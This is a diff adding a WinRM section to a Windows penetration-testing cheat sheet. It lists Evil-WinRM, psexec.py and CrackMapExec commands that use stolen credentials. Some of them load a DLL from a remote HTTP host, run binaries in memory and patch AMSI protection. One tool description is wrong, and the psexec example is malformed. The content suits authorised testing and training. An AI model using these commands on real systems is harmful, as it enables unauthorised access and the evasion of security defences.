@@ -229,6 +229,43 @@ Because answer files are cached to the computer during Windows Setup, **your ans
 
 Before you deliver the computer to a customer, you must delete the cached answer file in the **%WINDIR%\panther** directory. There might be potential security issues if you include domain passwords, product keys, or other sensitive data in your answer file.
 
+#### Windows Remote Management
+
+WinRM is Microsoft's implementation of WS-Management in Windows which allows systems to access or exchange management information across a common network.
+
+If you find a user, try also to use WinRM
+
+[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate.
+[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) remote shell/that lets you execute processes on remote windows systems
+
+Usage:
+
+- **--scripts**: Powershell scripts local path
+- **--executables**: C# executables local path
+- **--hash**: NTHash
+
+```bash
+evil-winrm -i IP -u USERNAME -p PASSWORD --scripts PS_SCRIPTS_PATH --executables EXES_PATH
+\*Evil-WinRM\* PS >upload /root/files/                       # Upload a file (Relative paths are not allowed to use on download/upload.)
+\*Evil-WinRM\* PS >download file                             # Download file (Relative paths are not allowed to use on download/upload.)
+\*Evil-WinRM\* PS >services                                  # List all services showing if there your account has permissions over each one.
+\*Evil-WinRM\* PS >PowerView.ps1                             # Executes PowerView.ps1
+\*Evil-WinRM\* PS >menu                                      # Displays loaded functions from the PowerShell script executed
+
+# Advanced commands
+\*Evil-WinRM\* PS >Invoke-Binary /opt/file.exe               # Allows exes compiled from c# to be executed in memory.
+\*Evil-WinRM\* PS >Dll-Loader -http -path http://IP/File.dll # Allows loading dll libraries in memory
+\*Evil-WinRM\* PS >Bypass-4MSI                               # Patchs AMSI protection
+```
+
+```bash
+python psexec.py USERNAME@PASSWORD
+```
+
+```bash
+cme winrm IP -u USERNAME -p PASSWORD
+```
+
 #### Process Enumeration
 
 ```bash
